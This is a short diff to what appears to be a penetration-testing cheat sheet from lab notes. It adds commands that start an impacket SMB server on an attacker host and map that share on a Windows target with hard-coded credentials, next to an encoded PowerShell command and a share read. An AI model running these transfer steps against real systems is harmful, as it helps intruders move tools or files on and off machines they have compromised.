@@ -173,7 +173,6 @@ powershell -encodedcommand ACkACgA=
 
 impacket-smbserver share .
 
-
 Get-Content //10.10.14.4/file
 
 net use z: //10.10.10.14/shares 
@@ -183,6 +182,10 @@ $pass = "max" | ConvertTo-SecureString -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PsCredential('max, $pass')
 
 New-PSDrive -name max -root \\10.10.14.14\share -Credential $cred -PSProvider "filesystem"
+------
+        sudo impacket-smbserver -smb2support -username max -password root sharename .
+
+        net use z: \\10.10.14.41\sharename /user:max root
 
 # PowerShellMafia (POWERUP)
 
